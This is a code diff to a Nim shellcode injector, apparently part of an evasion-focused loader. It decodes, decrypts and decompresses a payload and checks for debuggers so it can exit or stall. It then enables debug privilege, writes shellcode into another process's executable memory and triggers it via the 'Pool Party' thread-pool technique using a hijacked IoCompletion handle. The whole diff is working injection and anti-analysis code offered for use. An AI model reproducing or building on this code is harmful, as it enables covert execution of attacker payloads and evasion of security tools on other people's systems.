@@ -2,14 +2,7 @@
 import params
 import antidebug
 include helpers
-# External
-import os
-import RC4
-import winim
-import strutils
-import nimprotect
-import supersnappy
-from std/base64 import decode
+
 
 # Raising VEH
 {.emit: """
@@ -25,6 +18,13 @@ proc execute(payload: string, processName: string, sleepSeconds: int = 0, isEncr
         
     # Sleep at execution
     sleepUselessCalculations(sleepSeconds)
+
+    # Anti debug check
+    if antiDebugAction in[protectString("die"), protectString("troll")] and isDebugged():
+        if antiDebugAction == protectString("die"):
+            quit(1)
+        elif antiDebugAction == protectString("troll"):
+            sleepUselessCalculations(999999999)
 
     # Decode, (Decrypt) and decompress shellcode
     let commandLineParams = commandLineParams()
@@ -45,38 +45,28 @@ proc execute(payload: string, processName: string, sleepSeconds: int = 0, isEncr
     else:
         shellcodeStr = uncompress(decodedPayload)
 
-    # Anti debug check
-    if antiDebugAction in[protectString("die"), protectString("troll")] and isDebugged():
-        if antiDebugAction == protectString("die"):
-            quit(1)
-        elif antiDebugAction == protectString("troll"):
-            sleepUselessCalculations(999999999)
-
-    # Enable debug privilege
-    discard setDebugPrivilege()
-
+    # Converting shellcode
     var shellcodeBytes = @(shellcodeStr.toOpenArrayByte(0, shellcodeStr.high))
     var shellcodeBytesPtr = addr shellcodeBytes[0]
+    
+    # Enabling debug privilege
+    discard setDebugPrivilege()
 
-    # Open target process
+    # Get target PID
+    var targetPid = getPid(processName)
+    if targetPid == 0 and waitForProcess:
+        while targetPid == 0:
+            targetPid = getPid(processName)
+            Sleep(10 * 1000)
+
+    # Opening target process
     var targetHandle = OpenProcess(
         PROCESS_VM_READ or PROCESS_VM_WRITE or PROCESS_VM_OPERATION or PROCESS_DUP_HANDLE or PROCESS_QUERY_INFORMATION,
         FALSE,
-        cast[DWORD](getPid(processName))
+        cast[DWORD](targetPid)
         )
-
-    # # Duplicate target worker factory handle
-    # var workerFactoryHandle = hijackProcessHandle(newWideCString("TpWorkerFactory"), targetHandle, WORKER_FACTORY_ALL_ACCESS)
-
-    # # Query target worker factory
-    # var WorkerFactoryInformation: WORKER_FACTORY_BASIC_INFORMATION
-    # NtQueryInformationWorkerFactory(
-    #     workerFactoryHandle,
-    #     WorkerFactoryInfoClass.WorkerFactoryBasicInformation,
-    #     addr WorkerFactoryInformation,
-    #     cast[ULONG](sizeof(WorkerFactoryInformation)),
-    #     NULL
-    #     )
+    if targetHandle == 0:
+        quit(1)
 
     # Allocating memory in target process
     let targetPtr = VirtualAllocEx(
@@ -86,6 +76,8 @@ proc execute(payload: string, processName: string, sleepSeconds: int = 0, isEncr
         MEM_COMMIT,
         PAGE_EXECUTE_READ_WRITE
     )
+    if cast[int](targetPtr) == 0:
+        quit(1)
 
     # Writing shellcode to target process
     var bytesWritten: SIZE_T
@@ -96,18 +88,35 @@ proc execute(payload: string, processName: string, sleepSeconds: int = 0, isEncr
         cast[SIZE_T](shellcodeBytes.len),
         addr bytesWritten
     )
-    echo "Shellcode: " & $cast[int](targetPtr).toHex
-    discard stdin.readLine
+    if bytesWritten == 0:
+        quit(1)
+    # echo "Remote shellcode: " & $cast[int](targetPtr).toHex
 
-    # Varient 7 ?
-    var Direct: TP_DIRECT
-    Direct.Callback = targetPtr
-    var RemoteDirectAddress: PTP_DIRECT = cast[PTP_DIRECT](VirtualAllocEx(targetHandle, NULL, sizeof(TP_DIRECT), MEM_COMMIT or MEM_RESERVE, PAGE_READWRITE))
-    discard NtWriteVirtualMemory(targetHandle, RemoteDirectAddress, addr Direct, sizeof(TP_DIRECT), NULL)
-    echo "TP_DIRECT: " & $cast[int](RemoteDirectAddress).toHex
-    discard stdin.readLine
-    var IoCompletionHandle = hijackProcessHandle(newWideCString("IoCompletion"), targetHandle, WORKER_FACTORY_ALL_ACCESS)
-    ZwSetIoCompletion(IoCompletionHandle, RemoteDirectAddress, NULL, 0, 0)
+    # Pool Party varient 7
+    var direct: TP_DIRECT
+    direct.Callback = targetPtr
+    var remoteDirectAddress: PTP_DIRECT = cast[PTP_DIRECT](VirtualAllocEx(
+        targetHandle, 
+        NULL, 
+        sizeof(TP_DIRECT), 
+        MEM_COMMIT or MEM_RESERVE, 
+        PAGE_READWRITE
+    ))
+    if cast[int](remoteDirectAddress) == 0:
+        quit(1)
+    WriteProcessMemory(
+        targetHandle,
+        remoteDirectAddress,
+        addr direct,
+        sizeof(TP_DIRECT),
+        addr bytesWritten
+    )
+    if bytesWritten == 0:
+        quit(1)
+    # echo "Remote TP_DIRECT: " & $cast[int](remoteDirectAddress).toHex
+    var ioCompletionHandle = hijackProcessHandle(newWideCString(protectString("IoCompletion")), targetHandle, IO_COMPLETION_ALL_ACCESS)
+    NtSetIoCompletion(ioCompletionHandle, remoteDirectAddress, NULL, 0, 0)
+
 
 proc wrapExecute() =
     discard execute(
